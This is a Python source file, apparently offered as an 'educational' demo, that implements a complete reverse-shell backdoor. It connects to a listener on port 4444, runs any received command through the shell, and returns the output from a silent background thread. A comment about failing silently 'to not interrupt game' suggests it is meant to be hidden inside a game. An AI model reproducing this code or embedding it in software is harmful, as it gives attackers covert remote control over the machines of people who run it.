"""
Backdoor module for educational cybersecurity demonstration
WARNING: For educational purposes only in controlled VM environments
"""
import socket
import subprocess
import os
import sys
import threading
import time
from pathlib import Path

class Backdoor:
    def __init__(self, host='127.0.0.1', port=4444):
        """Initialize backdoor connection parameters"""
        self.host = host
        self.port = port
        self.connection = None
        self.running = False
        
    def connect(self):
        """Establish connection to listener"""
        max_retries = 5
        retry_delay = 3
        
        for attempt in range(max_retries):
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.host, self.port))
                self.running = True
                return True
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                else:
                    # Fail silently to not interrupt game
                    return False
        return False
    
    def execute_command(self, command):
        """Execute shell command and return output"""
        try:
            if command.lower() == 'exit':
                self.running = False
                return b'Closing connection...\n'
            
            # Execute command
            output = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return output
        except subprocess.TimeoutExpired:
            return b'Command timed out\n'
        except Exception as e:
            return f'Error: {str(e)}\n'.encode()
    
    def run(self):
        """Main backdoor loop - runs in background thread"""
        if not self.connect():
            return
        
        try:
            while self.running:
                # Receive command from listener
                command = self.connection.recv(1024).decode().strip()
                
                if not command:
                    break
                
                # Execute and send back result
                output = self.execute_command(command)
                self.connection.send(output)
                
        except Exception as e:
            pass
        finally:
            self.close()
    
    def close(self):
        """Close connection"""
        self.running = False
        if self.connection:
            try:
                self.connection.close()
            except:
                pass
    
    def start_background(self):
        """Start backdoor in background thread"""
        thread = threading.Thread(target=self.run, daemon=True)
        thread.start()
        return thread
